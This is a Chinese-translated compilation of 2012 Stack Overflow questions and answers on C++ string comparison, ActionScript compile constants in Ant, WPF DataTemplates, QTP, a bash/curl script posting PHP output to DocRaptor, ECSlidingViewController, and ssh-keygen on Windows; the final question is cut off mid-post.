> 
> 时间：2012-06-27T22:31:32.373
> 
> 标签：c++

在这种情况下，a 和“v1”并不相等......尽管内容相同......有人可以帮助提出一种方法，使 a 等于“v1”

```
int main()
{
    stringstream s;
    string a;
    char *c="v1";
    s<<c;
    a=s.str();
    cout<<a;
    int i=strcmp(a, "v1");
    cout<<"i="<<i;
} 
```

在比较 a 和“v1”时不相等...请提出一些方法，以便我可以使 a 等于“v1”...最终目标是使 a 等于“v1” ”。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-06-27T22:33:42.443

[因为`strcmp`当输入匹配时返回 0。](http://en.cppreference.com/w/cpp/string/byte/strcmp)

（顺便说一句，我假设您的实际代码是`strcmp(a.c_str(), "v1")`，否则它不会编译。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-27T22:38:26.157

`strcmp`需要 a `char *`，其中 as`a`的类型为`std::string`。

该类`std::string`提供了一种方法，该方法返回与`strcmp`.
尝试：`int i = strcmp(a.c_str(), "v1");`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T22:45:49.660

它们*是*相同的，至少在词汇上是相同的。请注意，当字符串相同时`strcmp`返回`0`，这与`true`.

```
int main()
{
    stringstream s;
    string a;
    const char *c="v1";
    s<<c;
    a=s.str();
    cout << a << "\t" << c;
    cout << endl;
    cout << boolalpha << (a == c) << endl;
    cout << boolalpha << (!strcmp(c, a.c_str())) << endl;
} 
```

输出：

```
v1      v1
true
true 
```

# actionscript-3 - 在 ant 脚本中设置时，AS3 编译时间常数会出错

> ID：11235700
> 
> 赞同：2
> 
> 时间：2012-06-27T22:31:50.593
> 
> 标签：actionscript-3, apache-flex, ant

我有一个使用编译时间常量的 AS3 项目。这在 FDT 中运行良好，并添加了如下编译器参数：

```
-define=CONFIG::buildver,"0.1" 
```

但是在使用 ant 脚本构建时尝试复制它时：

```
<project name="ProjectName" default="compileMain" basedir=".">
<property file="build.properties" />    
<target name="compileMain">
    <exec executable="${mxmlc}">

        <arg line='-define=CONFIG::testvar,"0.1"' />
        <arg line="-source-path '${classesdir}'" />
        <arg line="-library-path '${flex3libsdir}'" />
        <arg line="-output '${bindir}/TestSwf.swf'" />
        <arg line="-file-specs '${classesdir}/Test_Main.as'" />

    </exec>
</target> 
```

我得到“错误：配置值的初始化程序必须是编译时间常数。”

我尝试使用 -define+=CONFIG，但得到相同的响应。

有编译时间常数和蚂蚁经验的人有什么建议吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-28T07:51:55.520

我这样使用它：

```
<define name="CONFIG::LOGGING" value="false" /> 
```

但`<compc>`因此不确定它是否会在 exec 中工作......但你可以尝试;）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-29T17:33:22.723

我在每行上使用`arg`属性`value`和交替键/值。不确定这是否是最佳实践（对我来说似乎相当粗制滥造），但我确实记得几年前我在设置我的 Ant 脚本时尝试了一堆不同的选项，这就是卡住了。

由于“不损坏，不修复”的原则，我已经离开它并且非常愉快地使用了两年多。

使用您的示例，它看起来像这样：

```
<project name="ProjectName" default="compileMain" basedir=".">
<property file="build.properties" />    
<target name="compileMain">
    <exec executable="${mxmlc}">

    <arg value="-define=CONFIG::testvar,0.1"/>
    <arg value="-source-path"/>
    <arg value="${classesdir}"/>
    <arg value="-library-path"/>
    <arg value="${flex3libsdir}"/>
    <arg value="-output"/>
    <arg value="${bindir}/TestSwf.swf"/>
    <arg valye="-file-specs"/>
    <arg value="${classesdir}/Test_Main.as"/>

    </exec>
</target> 
```

# github - 开发时在所有设备上同时刷新网站的脚本

> ID：11235701
> 
> 赞同：0
> 
> 时间：2012-06-27T22:31:52.490
> 
> 标签：github

几周前，我在 github 上发布了一个脚本，该脚本将在开发时同时刷新网络中所有设备上的网站，但我只是不记得名字了。

我希望这个答案不计入“这不是一个研究中心论坛”类别，但更希望有人能记住它，我们可以为可能正在寻找它的用户分享答案。

在我得到一千张反对票之前，请告诉我这是不是在错误的地方提出的问题（但还有其他地方吗？）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-01T21:00:47.913

好的，我终于又找到了：

[https://github.com/marstall/shim](https://github.com/marstall/shim)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T23:21:57.230

[Meteor](http://www.meteor.com/)最近受到了很多关注，但如果您只需要刷新整个页面，您可以使用任何 pub/sub 框架，例如[Faye](http://faye.jcoglan.com/)和几行 javascript。

# wpf - 如何在另一个 DataTemplate 中继承 DataTemplate

> ID：11235706
> 
> 赞同：0
> 
> 时间：2012-06-27T22:32:16.593
> 
> 标签：wpf, datatemplate

好的，所以我不知道这是否可能，但是？我正在尝试填充 DataGrid（确切地说是 Telerik RadGridView）并希望动态确定编辑控件。我正在尝试创建一个网格来显示正在导入应用程序的数据并显示三列（属性名称、入站数据和当前数据库数据）。基于我的对象类中的属性，“属性名称”列需要在其前面放置一个 CheckBox。这与其他列一起有条件地附加一个按钮，以便可以进行查找（一个 TextBox 或 TextBlock 将位于按钮前面以显示当前值）。我希望这能解释我正在尝试做的事情。下面是我想出的 XAML。

哦，这将进入 WPF MVVM C#​​ 应用程序。

感谢您的任何帮助，您可以提供。

```
<UserControl x:Class="PulseHL7Importer.Views.DetailView"
         xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
         xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
         xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" 
         xmlns:d="http://schemas.microsoft.com/expression/blend/2008" 
         xmlns:telerik="http://schemas.telerik.com/2008/xaml/presentation"
         xmlns:p="clr-namespace:PulseHL7Importer.Properties"
         xmlns:fw="clr-namespace:PulseHL7Importer.Framework"
         xmlns:vm="clr-namespace:PulseHL7Importer.ViewModels"
         mc:Ignorable="d" 
         d:DesignHeight="200" d:DesignWidth="961">
<UserControl.Resources>
    <telerik:BooleanToVisibilityConverter x:Key="BooleanVisibilityConverter" />
    <DataTemplate x:Key="AddCheckBox">
        <DataTemplate.Triggers>
            <DataTrigger Binding="{Binding HasCheckBox}" Value="True" />
        </DataTemplate.Triggers>
        <CheckBox IsChecked="{Binding IsChecked}" Margin="2,0,5,0" VerticalAlignment="Center" HorizontalAlignment="Center" />
    </DataTemplate>
    <DataTemplate x:Key="AddTextBlock">
        <DataTemplate.Triggers>
            <DataTrigger Binding="{Binding IsReadOnly}" Value="True" />
        </DataTemplate.Triggers>
        <TextBlock Text="{Binding Value}" />
    </DataTemplate>
    <DataTemplate x:Key="AddTextBox">
        <DataTemplate.Triggers>
            <DataTrigger Binding="{Binding IsReadOnly}" Value="False" />
        </DataTemplate.Triggers>
        <TextBox Text="{Binding Value}" />
    </DataTemplate>
    <DataTemplate x:Key="AddButton">
        <DataTemplate.Triggers>
            <DataTrigger Binding="{Binding HasLookup}" Value="True" />
        </DataTemplate.Triggers>
        <Button Content="..." Width="{Binding RelativeSource={RelativeSource Self}, Path=ActualHeight}"
                VerticalAlignment="Center" HorizontalAlignment="Center"/>
    </DataTemplate>
    <DataTemplate x:Key="ConditionalTemplate">
        <Grid>
            <Grid.ColumnDefinitions>
                <ColumnDefinition Width="Auto" />
                <ColumnDefinition Width="*" />
                <ColumnDefinition Width="Auto" />
            </Grid.ColumnDefinitions>
            <ContentPresenter Grid.Column="0" Content="{Binding}" ContentTemplate="{StaticResource AddCheckBox}" />
            <ContentPresenter Grid.Column="1" Content="{Binding}" ContentTemplate="{StaticResource AddTextBlock}" />
            <ContentPresenter Grid.Column="1" Content="{Binding}" ContentTemplate="{StaticResource AddTextBox}" />
            <ContentPresenter Grid.Column="2" Content="{Binding}" ContentTemplate="{StaticResource AddButton}" />
        </Grid>
    </DataTemplate>
</UserControl.Resources>
<Grid d:DataContext="{d:DesignInstance vm:DetailViewModel}">
    <telerik:RadDockPanel Width="Auto">
        <!-- Toolbar -->
        <telerik:RadDockPanel telerik:RadDockPanel.Dock="Top">
            <telerik:RadToolBar OverflowButtonVisibility="Collapsed" />
        </telerik:RadDockPanel>

        <!-- Warnings and Errors -->
        <telerik:RadDockPanel telerik:RadDockPanel.Dock="Bottom">
            <telerik:GroupBox Header="Warnings and Errors"
                              telerik:Theming.Theme="{Binding Source={x:Static p:Settings.Default}, Path=SelectedTheme}">
                <TextBox Height="60" IsReadOnly="True"
                         VerticalScrollBarVisibility="Auto"
                         Background="FloralWhite" />
            </telerik:GroupBox>
        </telerik:RadDockPanel>

        <!-- Grid Area -->
        <telerik:RadDockPanel Width="Auto">
            <telerik:RadGridView Name="DetailGridView" Width="Auto" AutoGenerateColumns="False" RowIndicatorVisibility="Collapsed"
                                 CanUserDeleteRows="False" CanUserInsertRows="False" CanUserReorderColumns="False" 
                                 CanUserSortColumns="False" IsFilteringAllowed="False" ColumnWidth="*"
                                 ShowGroupPanel="False" ItemsSource="{Binding Path=Properties}" >
                <telerik:RadGridView.Columns>
                    <telerik:GridViewDataColumn Header="Name" DataMemberBinding="{Binding Path=Value}">
                        <telerik:GridViewDataColumn.CellTemplate>
                            <DataTemplate>
                                <ContentPresenter ContentTemplate="{StaticResource ConditionalTemplate}" Content="{Binding Path=Properties}" />
                            </DataTemplate>
                        </telerik:GridViewDataColumn.CellTemplate>
                        <telerik:GridViewDataColumn.CellEditTemplate>
                            <DataTemplate>
                                <ContentPresenter ContentTemplate="{StaticResource ConditionalTemplate}" Content="{Binding Path=Properties}" />
                            </DataTemplate>
                        </telerik:GridViewDataColumn.CellEditTemplate>
                    </telerik:GridViewDataColumn>
                    <telerik:GridViewDataColumn Header="Client Data" DataMemberBinding="{Binding Path=ClientData.Value}">
                        <telerik:GridViewDataColumn.CellEditTemplate>
                            <DataTemplate>
                                <ContentPresenter ContentTemplate="{StaticResource ConditionalTemplate}" Content="{Binding Path=ClientData}" />
                            </DataTemplate>
                        </telerik:GridViewDataColumn.CellEditTemplate>
                    </telerik:GridViewDataColumn>
                    <telerik:GridViewDataColumn Header="Pulse Data" DataMemberBinding="{Binding Path=PulseData.Value}">
                        <telerik:GridViewDataColumn.CellEditTemplate>
                            <DataTemplate>
                                <ContentPresenter ContentTemplate="{StaticResource ConditionalTemplate}" Content="{Binding Path=PulseData}" />
                            </DataTemplate>
                        </telerik:GridViewDataColumn.CellEditTemplate>
                    </telerik:GridViewDataColumn>
                </telerik:RadGridView.Columns>
            </telerik:RadGridView>
        </telerik:RadDockPanel>
    </telerik:RadDockPanel>
</Grid> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-27T22:35:03.200

通常`ContentPresenters`获取相应的隐式模板，因此您只需要将其中`Content`的一个绑定到您想要模板化的属性或 DataContext 并且应该对其进行模板化。

*（不确定这是否适用于您的问题，因为我不太明白您想说什么）*

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-07-06T14:46:03.480

好的，我已经设法通过一些技巧解决了这个问题。我现在在 CellEditTemplateSelector 中动态创建 DataTemplate。这使我可以检查所有属性并为适当的单元格添加控件和绑定。

这是基本的 XAML 网格：

```
 <telerik:RadGridView Name="DetailGridView" Width="Auto" AutoGenerateColumns="False" RowIndicatorVisibility="Collapsed"
                                 CanUserDeleteRows="False" CanUserInsertRows="False" CanUserReorderColumns="False" 
                                 CanUserSortColumns="False" IsFilteringAllowed="False" ColumnWidth="*"
                                 ShowGroupPanel="False" ItemsSource="{Binding Path=Properties}">
                <telerik:RadGridView.Columns>
                    <telerik:GridViewDataColumn Header="Name" IsReadOnlyBinding="{Binding Path=IsReadOnly}"
                                                DataMemberBinding="{Binding Path=Value}"
                                                CellTemplateSelector="{StaticResource CellTemplateSelector}"
                                                CellEditTemplateSelector="{StaticResource CellEditTemplateSelector}">
                        <telerik:GridViewDataColumn.CellStyle>
                            <Style>
                                <Style.Triggers>
                                    <DataTrigger Binding="{Binding Path=IsReadOnly}" Value="True">
                                        <Setter Property="Canvas.Background" Value="LightGoldenrodYellow" />
                                    </DataTrigger>
                                    <DataTrigger Binding="{Binding Path=IsGroupItem}" Value="True">
                                        <Setter Property="Canvas.Background"  Value="LightGray" />
                                    </DataTrigger>
                                    <DataTrigger Binding="{Binding Path=IsRequired}" Value="True">
                                        <Setter Property="TextElement.Foreground" Value="Red" />
                                    </DataTrigger>
                                </Style.Triggers>
                            </Style>
                        </telerik:GridViewDataColumn.CellStyle>
                    </telerik:GridViewDataColumn>
                    <telerik:GridViewMaskedTextBoxColumn Header="Client Data"
                                                DataMemberBinding="{Binding Path=ClientData.Value}"
                                                CellEditTemplateSelector="{StaticResource CellEditTemplateSelector}">
                        <telerik:GridViewMaskedTextBoxColumn.CellStyle>
                            <Style>
                                <Style.Triggers>
                                    <DataTrigger Binding="{Binding Path=ClientData.IsReadOnly}" Value="True">
                                        <Setter Property="Canvas.Background" Value="LightGoldenrodYellow" />
                                    </DataTrigger>
                                    <DataTrigger Binding="{Binding Path=IsGroupItem}" Value="True">
                                        <Setter Property="Canvas.Background"  Value="LightGray" />
                                    </DataTrigger>
                                </Style.Triggers>
                            </Style>
                        </telerik:GridViewMaskedTextBoxColumn.CellStyle>
                    </telerik:GridViewMaskedTextBoxColumn>
                    <telerik:GridViewDataColumn Header="Pulse Data"
                                                DataMemberBinding="{Binding Path=PulseData.Value}" 
                                                CellEditTemplateSelector="{StaticResource CellEditTemplateSelector}">
                        <telerik:GridViewDataColumn.CellStyle>
                            <Style>
                                <Style.Triggers>
                                   <DataTrigger Binding="{Binding Path=PulseData.IsReadOnly}" Value="True">
                                        <Setter Property="Canvas.Background" Value="LightGoldenrodYellow" />
                                   </DataTrigger>
                                   <DataTrigger Binding="{Binding Path=IsGroupItem}" Value="True">
                                        <Setter Property="Canvas.Background"  Value="LightGray" />
                                    </DataTrigger>
                                </Style.Triggers>
                            </Style>
                        </telerik:GridViewDataColumn.CellStyle>
                    </telerik:GridViewDataColumn>
                </telerik:RadGridView.Columns>
            </telerik:RadGridView> 
```

这是 CellEditTemplateSelector：

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Windows.Controls;
using System.Windows;
using Telerik.Windows.Controls.GridView;
using System.Windows.Markup;
using System.Windows.Media;

namespace PulseHL7Importer.Framework
{
public class CellEditTemplateSelector : DataTemplateSelector
{
    public override System.Windows.DataTemplate SelectTemplate(object item, System.Windows.DependencyObject container)
    {
        FrameworkElement element = (FrameworkElement)container;

        if (element != null && item != null && item is Property)
        {
            GridViewCell cell = (GridViewCell)container;
            Property property = (Property)item;
            Column column = null;
            StringBuilder grid = new StringBuilder();
            BrushConverter converter = new BrushConverter();

            #region Control Header

            grid.Append("<DataTemplate");
            grid.Append(" xmlns=\"http://schemas.microsoft.com/winfx/2006/xaml/presentation\"");
            grid.Append(" xmlns:x=\"http://schemas.microsoft.com/winfx/2006/xaml\"");
            grid.Append(" xmlns:mc=\"http://schemas.openxmlformats.org/markup-compatibility/2006\"");
            grid.Append(" xmlns:d=\"http://schemas.microsoft.com/expression/blend/2008\"");
            grid.Append(" xmlns:telerik=\"http://schemas.telerik.com/2008/xaml/presentation\"");
            grid.Append(" mc:Ignorable=\"d\"");
            grid.Append(">");

            #endregion  //Control Header

            switch (cell.Column.Header.ToString().Replace(" ", "").ToUpper())
            {
                case "NAME":
                    grid.Append("<StackPanel Orientation=\"Horizontal\"");
                    if (property.IsGroupItem)
                        grid.Append(" Background=\"LightGray\">");
                    else
                        grid.Append(">");
                    if (property.HasCheckBox)
                    {
                        grid.Append("<Grid Width=\"{Binding RelativeSource={RelativeSource FindAncestor, AncestorType=StackPanel, AncestorLevel=1}," +
                            " Path=ActualWidth}\">");
                        grid.Append("<Grid.ColumnDefinitions>");
                        grid.Append("<ColumnDefinition Width=\"Auto\" />");
                        grid.Append("<ColumnDefinition Width=\"*\" />");
                        grid.Append("</Grid.ColumnDefinitions>");
                    }
                    if (property.HasCheckBox)
                        grid.Append("<CheckBox Grid.Column=\"0\" IsChecked=\"{Binding Path=IsChecked}\" Margin=\"3,2,3,0\" />");
                    if (property.IsReadOnly)
                        grid.AppendFormat("<TextBlock{0} Text=\"{{Binding Path=Value}}\"", property.HasCheckBox ? " Grid.Column=\"1\"" : "");
                    else
                        grid.AppendFormat("<TextBox{0} Text=\"{{Binding Path=Value}}\"", property.HasCheckBox ? " Grid.Column=\"1\"" : "");
                    if (!property.HasCheckBox)
                    {
                        grid.Append(" Margin=\"15,0,0,0\" ");
                        grid.Append(" Width=\"{Binding RelativeSource={RelativeSource FindAncestor, AncestorType=StackPanel, AncestorLevel=1}," +
                            " Path=ActualWidth}\"");
                    }
                    if(!property.IsReadOnly)
                        grid.Append(" BorderBrush=\"{Binding RelativeSource={RelativeSource FindAncestor, AncestorType=StackPanel, AncestorLevel=1}," +
                            " Path=BorderBrush}\"");
                    grid.Append(" Background=\"{Binding RelativeSource={RelativeSource FindAncestor, AncestorType=StackPanel, AncestorLevel=1}," +
                        " Path=Background}\" />");
                    if (property.HasCheckBox)
                        grid.Append("</Grid>");
                    grid.Append("</StackPanel>");
                    break;
                case "CLIENTDATA":
                    column = property.ClientData;

                    grid.Append(this.BuildColumn(property, "ClientData", column));
                    break;
                case "PULSEDATA":
                    column = property.PulseData;

                    grid.Append(this.BuildColumn(property, "PulseData", column));
                    break;
            }

            #region Control Footer

            grid.Append("</DataTemplate>");

            #endregion

            if (!string.IsNullOrWhiteSpace(grid.ToString()))
            {
                return (DataTemplate)XamlReader.Parse(grid.ToString());
            }
        }

        return base.SelectTemplate(item, container);
    }

    string BuildColumn(Property property, string columnName, Column column)
    {
        StringBuilder grid = new StringBuilder();

        try
        {
            grid.Append("<StackPanel Orientation=\"Horizontal\"");
            if (property.IsGroupItem)
                grid.Append(" Background=\"LightGray\">");
            else if (column.IsReadOnly)
                grid.Append(" Background=\"LightGoldenrodYellow\">");
            else
                grid.Append(">");
            if (column.Options != null && column.Options.Count > 0)
            {
                grid.Append("<telerik:RadComboBox SelectedValue=\"{Binding Path=ClientData.Value}\"" +
                    " ItemsSource=\"{Binding Path=" + columnName + ".Options}\"" +
                    " IsReadOnly=\"{Binding Path=" + columnName + ".IsReadOnly}\"" +
                    " Width=\"{Binding RelativeSource={RelativeSource FindAncestor, AncestorType=StackPanel, AncestorLevel=1}," +
                    " Path=ActualWidth}\" />");
            }
            else
            {
                grid.Append("<Grid Width=\"{Binding RelativeSource={RelativeSource FindAncestor, AncestorType=StackPanel, AncestorLevel=1}," +
                    " Path=ActualWidth}\">");
                grid.Append("<Grid.ColumnDefinitions>");
                if (column.HasCheckBox)
                    grid.Append("<ColumnDefinition width=\"Auto\" />");
                grid.Append("<ColumnDefinition Width=\"*\" />");
                if (column.HasButton)
                    grid.Append("<ColumnDefinition Width=\"21\" />");
                grid.Append("</Grid.ColumnDefinitions>");
                if (column.HasCheckBox)
                    grid.Append("<CheckBox Grid.Column=\"0\"" +
                        " IsChecked=\"{Binding Path=" + columnName + ".IsChecked}\" Margin=\"3,2,3,0\" />");
                if (column.IsReadOnly)
                {
                    grid.AppendFormat("<TextBlock{0} Text=\"{{Binding Path=" + columnName + ".Value}}\"",
                        column.HasCheckBox ? " Grid.Column=\"1\"" : " Grid.Column=\"0\"");
                    if (property.IsGroupItem)
                        grid.Append(" Margin=\"4,3,3,0\"");
                    else
                        grid.Append(" Margin=\"4,0,0,0\"");
                }
                else if (!string.IsNullOrWhiteSpace(column.Mask))
                {
                    grid.AppendFormat("<telerik:RadMaskedTextBox{0} Value=\"{{Binding Path=" + columnName + ".Value}}\"" +
                        " Mask=\"{{Binding Path=" + columnName + ".Mask}}\"",
                        column.HasCheckBox ? " Grid.Column=\"1\"" : " Grid.Column=\"0\"");
                }
                else
                    grid.AppendFormat("<TextBox{0} Text=\"{{Binding Path=" + columnName + ".Value}}\"",
                        column.HasCheckBox ? " Grid.Column=\"1\"" : " Grid.Column=\"0\"");
                if (!property.IsReadOnly)
                    grid.Append(" BorderBrush=\"{Binding RelativeSource={RelativeSource FindAncestor, AncestorType=StackPanel, AncestorLevel=1}," +
                        " Path=BorderBrush}\"");
                grid.Append(" Background=\"{Binding RelativeSource={RelativeSource FindAncestor, AncestorType=StackPanel, AncestorLevel=1}," +
                    " Path=Background}\" />");
                if (column.HasButton)
                    grid.AppendFormat("<Button Grid.Column=\"{0}\" Content=\"...\" />",
                        column.HasCheckBox ? "2" : "1");
                grid.Append("</Grid>");
            }
            grid.Append("</StackPanel>");

            return grid.ToString();
        }
        catch (Exception ex)
        {
            throw ex;
        }
        finally
        {
            grid.Clear();
        }

        return string.Empty;
    }
}
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-27T22:46:53.530

您可以将 DataTemplate 的 DataType 属性设置为不同视图模型使用的不同类。

如果同一个视图模型类必须根据内部值有条件地返回不同的模板，您可以在 App.xaml 中声明您的模板

```
<DataTemplate x:Key="AddCheckBox">
     ...
</DataTemplate> 
```

然后通过使用在视图模型中引用它

```
public DataTemplate ConditionalTemplate
    {
        get
        {
            if (this.ConditionMet)
                return Application.Current.Resources["AddCheckBox"] as DataTemplate;
            else
                return Application.Current.Resources["DifferentTemplate"] as DataTemplate;
        }
    } 
```

希望这可以帮助

# automation - QTP 11 Object Spy 无法识别 Browser.Page.WinObject 下面的任何对象

> ID：11235721
> 
> 赞同：0
> 
> 时间：2012-06-27T22:33:01.817
> 
> 标签：automation, qtp

![在此处输入图像描述](../Images/161c6d760fc44a171ce916744b23a666.png)我最近从 QTP 10 切换到 11，现在当我使用 Object Spy 时，它无法识别 Browser.Page.WinObject 下面的任何内容。这意味着它识别出有一个浏览器并且它有一个窗口，但它不会读取按钮。链接等

谢谢您的帮助。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-07-08T06:13:05.703

[通过补丁QTPWEB_00078 将对](http://support.openview.hp.com/selfsolve/document/FID/DOCUMENTUM_QTPWEB_00078)Internet Explorer 9 (IE9) 的支持添加到QTP11 。

您必须安装此补丁或将浏览器降级到 IE8。

# php - 在 shell 脚本中使用 PHP 的 HTML 输出

> ID：11235731
> 
> 赞同：1
> 
> 时间：2012-06-27T22:33:47.253
> 
> 标签：php, bash, curl

我有一个创建大型复杂表的 PHP 脚本。我正在尝试设置一个 shell 脚本，该脚本将接受 ID 作为参数，然后使用 ID 运行 PHP 脚本并接受 PHP 脚本的 HTML 输出，作为 cURL 发布到 DocRaptor 的一部分以制作 PDF。

示例 shell 脚本如下所示，我希望 document_content 是我生成的 HTML。

```
myHTML = usr/bin/php mytablemaker.php?id=$1
curl -H "Content-Type:application/json" -d'{"user_credentials":"API_KEY", "doc":{"name":"docraptor_sample.pdf", "document_type":"pdf", "test":"true", "document_content":"myHTML"}}' http://docraptor.com/docs > docraptor_sample.pdf 
```

我该如何正确地做到这一点？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:40:44.157

如果那是 bash，这样的东西应该可以工作：

```
myHTML = $(usr/bin/php mytablemaker.php?id=$1)
curl -H "Content-Type:application/json" -d'{"user_credentials":"API_KEY", "doc":{"name":"docraptor_sample.pdf", "document_type":"pdf", "test":"true", "document_content":"'"$myHTML"'"}}' http://docraptor.com/docs > docraptor_sample.pdf 
```

但是，您不要求 HTML，而是要求将 HTML 作为 json 字符串，所以让您的 PHP 脚本将字符串编码为 json，请参阅[`json_encode`](http://php.net/json_encode). 或者[`addcslashes($output, '"')`](http://php.net/addcslashes)对`"`人物做一个。

另见：

*   [Bash 脚本：将输出重定向到变量](https://stackoverflow.com/q/5701653/367456)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-27T22:51:40.710

最好的方法是修改 mytablemaker.php 以考虑命令行用例。例如像这样：

```
if(isset($argv[1])) {
    $id=$argv[1];
} else {
    $id=$_GET["id"];
} 
```

然后从 BASH 你做：

```
# Get HTML from PHP script and escape quotes and
# backslashes in string to comply to the JSON specification 
myHTML=$(/usr/bin/php -f mytablemaker.php $1 | sed -e 's/[\\"]/\\&/g')

# Put the value of myHTML in a JSON call and send it to the server
curl -H "Content-Type:application/json" -d'{"user_credentials":"API_KEY", "doc":{"name":"docraptor_sample.pdf", "document_type":"pdf", "test":"true", "document_content":"'"$myHTML"'"}}' http://docraptor.com/docs -o docraptor_sample.pdf 
```

请注意在最后一行完成的字符串连接：

```
'first part'"second part"'third part' 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-28T22:56:11.980

提供的示例没有提到 document_url 参数，但 DocRaptor 的错误消息却提到了。

使用我从[hakre](https://stackoverflow.com/users/367456/hakre)和[anttix](https://stackoverflow.com/users/770303/anttix)学到的工作代码！

```
curl -H "Content-Type:application/json" -d'{"user_credentials":"API_KEY", "doc":{"name":"docraptor_sample.pdf", "document_type":"pdf", "test":"false", "document_url":"'"http://foo.com/tablemaker.php?CTN=$1"'"}}' http://docraptor.com/docs -o docraptor_sample.pdf 
```

# iphone - 在 ECSlidingViewController 中，如何禁用顶视图滑出屏幕

> ID：11235735
> 
> 赞同：2
> 
> 时间：2012-06-27T22:34:14.127
> 
> 标签：iphone, objective-c, ios

所以我试图在我的应用程序中实现 ECSlidingViewController 示例。 [github 源代码](https://github.com/edgecase/ECSlidingViewController)

我唯一想做的修改它是防止 TopView 在更改包含的视图之前完全滑出屏幕，而是将 TopView 保持在原位，但使用它的新视图控制器更新它的包含视图从菜单中选择。Facebook 应用程序对此的看法正是我想要的，以防听起来令人困惑。

在项目中查看了一段时间后，我确定它肯定（并且显然）与 ECSlidingViewController.h 中的这行代码有关：

```
- (void)anchorTopViewOffScreenTo:(ECSide)side animations:(void(^)())animations onComplete:(void(^)())complete; 
```

我查看了在 .m 中调用它的位置：

```
- (void)anchorTopViewOffScreenTo:(ECSide)side{
[self anchorTopViewOffScreenTo:side animations:nil onComplete:nil];
}

- (void)anchorTopViewOffScreenTo:(ECSide)side animations:(void(^)())animations onComplete:(void(^)())complete
{
CGFloat newCenter = self.topView.center.x;
if (side == ECLeft) {
 newCenter = -self.resettedCenter;
} else if (side == ECRight) {
 newCenter = self.screenWidth + self.resettedCenter;
}

[self topViewHorizontalCenterWillChange:newCenter];

[UIView animateWithDuration:0.25f animations:^{
 if (animations) {
  animations();
}
[self updateTopViewHorizontalCenter:newCenter];
} completion:^(BOOL finished){
 if (complete) {
  complete();
 }
 _topViewIsOffScreen = YES;
 [self addTopViewSnapshot];
 dispatch_async(dispatch_get_main_queue(), ^{
   NSString *key = (side == ECLeft) ? ECSlidingViewTopDidAnchorLeft : ECSlidingViewTopDidAnchorRight;
  [[NSNotificationCenter defaultCenter] postNotificationName:key object:self userInfo:nil];
 });
}];
} 
```

这就是我猜测动画被告知如何制作动画的地方，但我不明白其中的任何内容如何告诉它移出屏幕。我是否忽略了像替换某些东西一样简单的东西`nil`？也许在某个地方我还没有找到另一个价值？这是我在 StackOverflow 上的第一个问题，虽然我一般是 Obj-C 的新手，但我对它的工作原理有相当不错的了解。所以我希望至少能收到一个正确方向的小费。谢谢！

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-07-21T22:45:52.613

只需使用以下方法

`- (void)anchorTopViewTo:(ECSide)side animations:(void (^)())animations onComplete:(void(^)())complete`

代替

`- (void)anchorTopViewOffScreenTo:(ECSide)side animations:(void(^)())animations onComplete:(void(^)())complete`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-15T00:51:45.093

如果它只是您要删除的弹跳，那么不要调用：

```
[self anchorTopViewOffScreenTo:side animations:nil onComplete:nil]; 
```

直接调用：

```
[self.slidingViewController resetTopView]; 
```

# ssh - 需要相当于命令“ssh-keygen -t rsa -C”的 Windows 7 cmd 行

> ID：11235737
> 
> 赞同：2
> 
> 时间：2012-06-27T22:34:25.100
> 
> 标签：ssh

我正在阅读 Michael Hartl 的“Ruby On Rails 3 教程”，并且已经到了将我的 first_app 推送到 Github 的地步。当我第一次尝试这个时，我收到错误“权限被拒绝：（公钥）。我认为问题是我没有 Github 的 SSH 密钥对。所以按照他们的建议从 URL [https://help生成一个新的密钥对.github.com/articles/generating-ssh-keys](https://help.github.com/articles/generating-ssh-keys) 我输入了 ssh-keygen -t rsa -C "your_email@youremail.com" 我收到错误“ssh-keygen 无法识别为外部或内部命令，可运行的程序或批处理文件。”

我正在使用 Windows 7 操作系统。所以我认为我的问题是这个命令行条目适用于基于 Mac 或 Linux 的命令行。有人可以告诉我此条目的 Windows 7 操作系统等效项，以便我可以创建一个新的 SSH 密钥对并继续学习本教程吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-27T22:37:15.377

将 url 翻转到特定于 windows 的： [https](https://help.github.com/articles/generating-ssh-keys#platform-windows) ://help.github.com/articles/generating-ssh-keys#platform-windows 并注意他们说的是“打开 GIT bash”，而不是 windows CMD。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-28T06:05:18.827

ssh-keygen 是 Openssh 包的一部分，您可以单独安装它（寻找适用于 Windows 的 CopSSH，它是 OpenSSH 的 Windows 端口）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-05-13T08:16:41.757

第一步是安装 open-ssh，一种方法确实是安装[Git for Windows](http://git-scm.com/download/win "适用于 Windows 的 Git - 立即开始下载")。在安装过程中，选择能够从命令行使用“unix”工具的第三个选项。

我有一个小型包装实用程序，可以将代理加载到[github](http://erezak.github.io/ssh-agent-wrapper-win "ssh-agen windows 包装器") (#selfplug) 和您的身份中的内存中，从而可以从命令行轻松使用。

# python - 获取应用程序错误：在应用程序引擎上部署时，GAE PyDev 应用程序中出现 2。在本地运行良好

> ID：11235738
> 
> 赞同：1
> 
> 时间：2012-06-27T22:34:36.373
> 
> 标签：python, google-app-engine, pydev, gae-eclipse-plugin

我正进入（状态

> DownloadError: ApplicationError: 2 (11004, 'getaddrinfo failed')

